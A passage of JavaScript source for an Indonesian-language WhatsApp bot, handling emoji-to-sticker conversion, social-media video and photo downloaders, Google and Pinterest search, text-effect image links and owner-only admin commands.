                {title: "Skype", rowId: `.skypeemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Skype`},
                {title: "Joy", rowId: `.joyemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji JOY`},
                {title: "Moji", rowId: `.mojiemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Moji`},
                {title: "Pedia", rowId: `.pediaemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Pedia`},
                {title: "Instagram", rowId: `.instagramemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Instagram`},
                {title: "Htc", rowId: `.htcmoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji HTC`},
                {title: "Mozilla", rowId: `.mozmoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Mozilla`},
                {title: "SoftBank", rowId: `.softmoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji SoftBank`},
                {title: "Docomo", rowId: `.docmoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Docomo`},
                {title: "Kddi", rowId: `.kddmoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji KDDI`}
	            ]
                }
                ]
            tganz.sendListMsg(m.chat, `❑ Kʟɪᴋ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ʟɪʜᴀᴛ ᴏᴘsɪ ᴇᴍᴏᴊɪ !`, ``, `⌘ Hᴀɪ Kᴀᴋᴀᴋ ⟨ *${pushname}* ⟩`, `OPSI 🛠️`, sections, m)
            }
            break
case 'emojiip': 
case 'ipmoji': 
case 'iphoneemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[0].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
case 'emojigoogle': 
case 'gomoji': 
case 'googlemoji': 
case 'googleemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[1].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
    }
break
case 'emojisamsung': 
case 'samoji': 
case 'sammoji': 
case 'samsungemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[2].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
case 'emojimicrosoft': 
case 'micmoji': 
case 'microsoftemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[3].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
case 'emojiwhatsapp': 
case 'emojiwa': 
case 'wamoji': 
case 'whatsappemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
    }
break
case 'emojitwitter': 
case 'emojitwt': 
case 'twtmoji':
case 'emojitwiter': 
case 'twitmoji': 
case 'twitteremoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[5].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
    }
break
case 'emojifacebook': 
case 'emojifb': 
case 'fbmoji': 
case 'facebookemoji': 
case 'fbemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[6].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
    }
break
case 'emojiskype': 
case 'skmoji': 
case 'skypeemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[7].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
case 'emojijoy': 
case 'joymoji': 
case 'joyemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[8].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
    }
break
case 'emojimoji': 
case 'mojimoji': 
case 'mojiemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[9].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
  }
break
case 'emojipedia': 
case 'emojiped': 
case 'pedmoji': 
case 'pediaemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[10].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
case 'emojinstagram': 
case 'emojiinstagram': 
case 'emojiig': 
case 'instagramemoji': 
case 'lgemoji':
case 'lgmoji':
case 'igmoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[11].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
case 'emojihtc':
case 'htcmoji':
case 'htcemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[12].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
case 'mozmoji':
case 'mozillaemoji':
case 'emojimozilla': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[13].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
case 'softmoji':
case 'softemoji':
case 'emojisoft': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[14].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
case 'docmoji':
case 'emojidocomo':
case 'docomoemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[15].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
case 'kddmoji':
case 'emojikddi':
case 'kddiemoji': {
 if (isBan) return reply(mess.ban)
if (!q) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[16].url}`
    		tganz.sendStickerFromUrl(m.chat,`${teks}`)	
    		console.log(teks)
   			})
   }
break
            case 'igphoto':
            case 'instaphoto':
            case 'instafoto':
            case 'igfoto': {
            if (isBan) return reply(mess.ban)
                if (!args[0]) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} link Instagram\n\n❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} https://www.instagram.com/p/ClU74LNpgaw/?igshid=YmMyMTA2M2Y=`)
                if (!isUrl(args[0])) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} link Instagram\n\n❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} https://www.instagram.com/p/ClU74LNpgaw/?igshid=YmMyMTA2M2Y=`)
                reply(mess.wait)
                let res = await fetch(global.api('alfa', '/api/downloader/instagram-photo', {
                    url: args[0]
                }, 'apikey'))
                if (!res.ok) throw await res.text()
                var result = await res.json()
                var result = result.result
                for (let i of result.url) {
                    tganz.sendFile(m.chat, i, 'ig.jpg', mess.done, m)
                }
            }
            break
            case 'instavideo':
            case 'instagram':
            case 'instavid':
            case "ig":
            case 'igreels':
            case "igstory":
            case "igdl":
            case 'instareels':
            case 'instareel': {
            if (isBan) return reply(mess.ban)
            if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix + command} ⟨ *Tempal Link Video/Reels Instagram nya* ⟩\n\n❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix + command} https://www.instagram.com/reel/Cqu_YVDgNZm/?utm_source=ig_web_button_share_sheet\n\n*◈ Jɪᴋᴀ ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ ᴀᴛᴀᴜ ᴘʀᴏsᴇs ʟᴀᴍᴀ ʙᴇʀᴀʀᴛɪ ʟɪɴᴋ ᴋᴀᴋᴀᴋ ᴀᴅᴀ ʏᴀɴɢ sᴀʟᴀʜ ᴀᴛᴀᴜ ʙᴜᴋᴀɴ ʟɪɴᴋ ᴅᴀʀɪ Iɴsᴛᴀɢʀᴀᴍ !*`)
            if (!q.includes('instagram')) return reply(`*Lɪɴᴋ Tɪᴅᴀᴋ Bᴇɴᴀʀ !!!*`)
   try {
			  let res = await fetch(`https://api.lolhuman.xyz/api/instagram?apikey=${lolkeysapi}&url=${q}`)
    let json = await res.json()
    let { result } = json 
    await m.reply(mess.wait)
    let cap = `🍁 *Sᴇʟᴇsᴀɪ Kᴀᴋ* 🍁
    
   Jᴀɴɢᴀɴ ʟᴜᴘᴀ ᴊᴏɪɴ ɢʀᴜᴘᴋᴜ ʏᴀ ᴋᴀᴋ :
⊙═════════════════════⊙
❐ https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz
⊙═════════════════════⊙`
await tganz.sendFile(m.chat, result[0], 'ig.mp4', cap, m)
} catch(e) {
m.reply('*Mᴀᴀғ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ᴛᴇʀsᴇʙᴜᴛ ᴅɪ ᴋᴀʀᴇɴᴀᴋᴀɴ ᴀᴅᴀɴʏᴀ ᴋᴇsᴀʟᴀʜᴀɴ ᴅᴀʟᴀᴍ ᴘᴇʟᴀᴄᴀᴋᴀɴ ʟɪɴᴋ ʏᴀɴɢ ᴋᴀᴍᴜ ᴋɪʀɪᴍ. Uᴛᴀᴍᴀᴋᴀɴ ʟɪɴᴋ ᴛᴇʀsᴇʙᴜᴛ ʙᴀʀᴜ ᴅᴀɴ ʜᴀsɪʟ sʜᴀʀᴇ ᴅɪ ᴍᴇᴅsᴏs Iɴsᴛᴀɢʀᴀᴍ !!!*')
}
}
				break
            case 'facebook':
            case 'fb':
            case 'fbdl': {
       if (isBan) return reply(mess.ban)
       if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix + command} ⟨ *Tempal Link Video Facebook nya* ⟩`)
            if (!q.includes('facebook')) return reply(`*Lɪɴᴋ Tɪᴅᴀᴋ Bᴇɴᴀʀ !!!*`)
        try {
			  let res = await fetch(`https://api.lolhuman.xyz/api/facebook?apikey=${lolkeysapi}&url=${q}`)
    let json = await res.json()
    let { result } = json 
    await m.reply(mess.wait)
    let cap = `🍁 *Sᴇʟᴇsᴀɪ Kᴀᴋ* 🍁
    
   Jᴀɴɢᴀɴ ʟᴜᴘᴀ ᴊᴏɪɴ ɢʀᴜᴘᴋᴜ ʏᴀ ᴋᴀᴋ :
⊙═════════════════════⊙
❐ https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz
⊙═════════════════════⊙`
await tganz.sendFile(m.chat, result[0], 'fb.mp4', cap, m)
} catch(e) {
m.reply('*Mᴀᴀғ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ᴛᴇʀsᴇʙᴜᴛ ᴅɪ ᴋᴀʀᴇɴᴀᴋᴀɴ ᴀᴅᴀɴʏᴀ ᴋᴇsᴀʟᴀʜᴀɴ ᴅᴀʟᴀᴍ ᴘᴇʟᴀᴄᴀᴋᴀɴ ʟɪɴᴋ ʏᴀɴɢ ᴋᴀᴍᴜ ᴋɪʀɪᴍ. Uᴛᴀᴍᴀᴋᴀɴ ʟɪɴᴋ ᴛᴇʀsᴇʙᴜᴛ ʙᴀʀᴜ ᴅᴀɴ ʜᴀsɪʟ sʜᴀʀᴇ ᴅɪ ᴍᴇᴅsᴏs Fᴀᴄᴇʙᴏᴏᴋ !!!*')
}
}
				break
				case 'twitterdownload': 
				case 'twitter': 
				case 'twtdl': {
				   if (isBan) return reply(mess.ban)
            if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix + command} ⟨ *Tempal Link Video Twitter nya* ⟩\n\n❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697\n\n*◈ Jɪᴋᴀ ᴛᴇʀᴊᴀᴅɪ ᴇʀʀᴏʀ ᴀᴛᴀᴜ ᴘʀᴏsᴇs ʟᴀᴍᴀ ʙᴇʀᴀʀᴛɪ ʟɪɴᴋ ᴋᴀᴋᴀᴋ ᴀᴅᴀ ʏᴀɴɢ sᴀʟᴀʜ ᴀᴛᴀᴜ ʙᴜᴋᴀɴ ʟɪɴᴋ ᴅᴀʀɪ Tᴡɪᴛᴛᴇʀ !*`)
      if (!q.includes('twitter')) return reply(`*Lɪɴᴋ Tɪᴅᴀᴋ Bᴇɴᴀʀ !!!*`)
  try {
      let res = await fetch(`https://api.lolhuman.xyz/api/twitter?apikey=${lolkeysapi}&url=${q}`)
			let json = await res.json()
    let { result } = json 
    await m.reply(mess.wait)
    let cap = `🍁 *Sᴇʟᴇsᴀɪ Kᴀᴋ* 🍁
    
   Jᴀɴɢᴀɴ ʟᴜᴘᴀ ᴊᴏɪɴ ɢʀᴜᴘᴋᴜ ʏᴀ ᴋᴀᴋ :
⊙═════════════════════⊙
❐ https://chat.whatsapp.com/BtryPpkWIKgBEqtYMKjnpz
⊙═════════════════════⊙`
await tganz.sendFile(m.chat, result[0], 'twt.mp4', cap, m)
} catch(e) {
m.reply('*Mᴀᴀғ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴅᴇᴏ ᴛᴇʀsᴇʙᴜᴛ ᴅɪ ᴋᴀʀᴇɴᴀᴋᴀɴ ᴀᴅᴀɴʏᴀ ᴋᴇsᴀʟᴀʜᴀɴ ᴅᴀʟᴀᴍ ᴘᴇʟᴀᴄᴀᴋᴀɴ ʟɪɴᴋ ʏᴀɴɢ ᴋᴀᴍᴜ ᴋɪʀɪᴍ. Uᴛᴀᴍᴀᴋᴀɴ ʟɪɴᴋ ᴛᴇʀsᴇʙᴜᴛ ʙᴀʀᴜ ᴅᴀɴ ʜᴀsɪʟ sʜᴀʀᴇ ᴅɪ ᴍᴇᴅsᴏs Tᴡɪᴛᴛᴇʀ !!!*')
}
}
			break
				case 'matikanbot':
				case 'shutdwn':
				case 'matikan':
				case 'shutdown': {
				    if (isBan) return reply(mess.ban)
            if (!isCreator) return reply(mess.owner)
	    		 m.reply(`*Sᴀᴍᴘᴀɪ ᴊᴜᴍᴘᴀ ʟᴀɢɪ ᴋᴀᴋᴀᴋ, sᴇᴍᴏɢᴀ sᴇʟᴀᴍᴀ ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴀᴋᴜ ᴅɪ sɪɴɪ ᴋᴇᴀᴅᴀᴀɴ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀɴ ᴛᴇɴᴀɴɢ ^~^*`)
             await sleep(3000)
             process.exit()
           }
               break
				       case 'listbanned': 
				       case 'listban': {
				        if (isBan) return reply(mess.ban)
            if (!isCreator) return reply(mess.owner)
            teksooo = '          ⫹ *Lɪsᴛ Bᴀɴɴᴇᴅ* ⫺\n\n❑ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴀᴅᴀʟᴀʜ ᴘᴇɴɢɢᴜɴᴀ ʏᴀɴɢ ᴛᴇʀʙᴀɴɴᴇᴅ !\n╔════════════════════❑'
            for (let i of banned) {
                teksooo += `\n╠☞ ⟨ wa.me/${i} ⟩`
            }
            teksooo += `\n╚════════════════════❑\n\n❑ Tᴏᴛᴀʟ ᴘᴇɴɢɢᴜɴᴀ ʙᴀɴ : ⟨ *${banned.length}* ⟩ !!!*`
            tganz.sendMessage(m.chat, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": banned } })
           }
             break
            case "pin":
            case "pinterest": {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} query\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} sakura`)
                reply(mess.wait)
                let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]               
                tganz.sendFile(m.chat, result, `Foto : ${text}.jpg`, `❑ Hᴀsɪʟ ᴘᴇɴᴄᴀʀɪᴀɴ ɢᴀᴍʙᴀʀ ᴘɪɴᴛᴇʀᴇsᴛ : *${text}*`, m)
            }
            break
            case "mf":
            case "mediafire": {
            if (isBan) return reply(mess.ban)
            if (!text) return reply('*Lɪɴᴋɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?*')
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return m.reply(`Lɪɴᴋ ᴋᴀᴋᴀᴋ ᴛɪᴅᴀᴋ ʙᴇɴᴀʀ !!!`)
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 10000000000) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `                             *★ INFO DOWNLOAD ★*
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
*Nᴀᴍᴀ Fɪʟᴇ* : ${baby1[0].nama}
*Uᴋᴜʀᴀɴ* : ⟨ ${baby1[0].size} ⟩
*Bᴇɴᴛᴜᴋ Fɪʟᴇ* : ${baby1[0].mime}
*Lɪɴᴋ* : ${baby1[0].link}
⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
*❑ Tᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ, Fɪʟᴇ sᴇᴅᴀɴɢ ᴅɪ ᴋɪʀɪᴍ...*`
m.reply(`${result4}`)
tganz.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => m.reply('*Mᴀᴀғ ᴋᴀᴋ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ, Sɪʟᴀʜᴋᴀɴ ᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ !*'))
}
break
              case 'tiktok':
              case 'tt':
              case 'tiktoknowm': {
            if (isBan) return reply(mess.ban)
              if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Lɪɴᴋ ᴠɪᴅᴇᴏ ᴛɪᴋᴛᴏᴋɴʏᴀ !\n\n◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n*☞ ${prefix+command} https://www.tiktok.com/@whitee.tee/video/7150679967989271834*`)
              if (!q.includes('tiktok')) return reply(`*Lɪɴᴋ Tɪᴅᴀᴋ Bᴇɴᴀʀ !!!*`)
              m.reply(`Mᴏʜᴏɴ ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ...\n\n*◈ Jɪᴋᴀ ғɪʟᴇ/ᴠɪᴅᴇᴏ ᴛɪᴅᴀᴋ ᴅɪ ᴋɪʀɪᴍ ʙᴇʀᴀʀᴛɪ ᴀᴅᴀ ʏᴀɴɢ sᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʟɪɴᴋ ʏᴀɴɢ ᴋᴀᴋᴀᴋ ʙᴇʀɪᴋᴀɴ !*`)
              let anup = await fetchJson(`https://api.yanzbotzz.repl.co/api/download/tiktok?url=${q}&apikey=YanzBotz`)
	           		anuh = anup.result
             tganz.sendMessage(m.chat, { video: {url : anuh.video.no_watermark}, mimetype: 'video/mp4', fileName: `${anup.result.title}.mp4`, caption: mess.done }, { quoted: m })
            }
            break
             case 'ttaudio': 
             case 'tiktokmusic': 
             case 'tiktoklagu': 
             case 'tiktokmusik': 
             case 'tiktokmp3': 
             case 'ttmp3': 
             case 'tiktokaudio': {
            if (isBan) return reply(mess.ban)
                  if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Lɪɴᴋ ᴠɪᴅᴇᴏ ᴛɪᴋᴛᴏᴋɴʏᴀ !\n\n◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n*☞ ${prefix+command} https://www.tiktok.com/@whitee.tee/video/7150679967989271834*`)
                  if (!q.includes('tiktok')) return reply(`*Lɪɴᴋ Tɪᴅᴀᴋ Bᴇɴᴀʀ !!!*`)
                    m.reply(`Mᴏʜᴏɴ ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ...\n\n*◈ Jɪᴋᴀ ғɪʟᴇ/ᴠɪᴅᴇᴏ ᴛɪᴅᴀᴋ ᴅɪ ᴋɪʀɪᴍ ʙᴇʀᴀʀᴛɪ ᴀᴅᴀ ʏᴀɴɢ sᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʟɪɴᴋ ʏᴀɴɢ ᴋᴀᴋᴀᴋ ʙᴇʀɪᴋᴀɴ !*`)
                    require('./lib/tiktok').Tiktok(q).then( data => {
                    tganz.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
                 })
              }
               break
            case 'google': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Hᴀɪ ᴋᴀᴋ, Mᴀᴜ ᴄᴀʀɪ ᴀᴘᴀ ?\n*◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Sɪɴɢᴋᴀᴛᴀɴ BUMN*`)
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `*⫹⫺ Hᴀsɪʟ ᴘᴇɴᴄᴀʀɪᴀɴ ᴅᴀʀɪ :* ${text}\n\n────────────────────────\n\n`
                for (let g of res) {
                teks += `⭔ *❑ Jᴜᴅᴜʟ :* ${g.title}\n`
                teks += `⭔ *❑ Dᴇsᴋʀɪᴘsɪ :* _${g.snippet}_\n`
                teks += `⭔ *❑ Lɪɴᴋ :* ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
            //ephoto360
            case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas': case 'holographic':
case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': case 'karbon': case 'neonlight2': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': case '3dbox': 
case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': case 'greenneon': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': case 'lion2': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike': case '3davengers': 
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': case 'whitebear': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': {
            if (isBan) return reply(mess.ban)
             if (!q) return m.reply(`*◈ Cᴀʀᴀ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix+ command} TᴇsᴛGᴀɴᴢ*`)
             m.reply(mess.wait)
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             if (/neonlight2/.test(command)) link = 'https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/whitebear/.test(command)) link = 'https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html'
             if (/holographic/.test(command)) link = 'https://textpro.me/holographic-3d-text-effect-975.html'
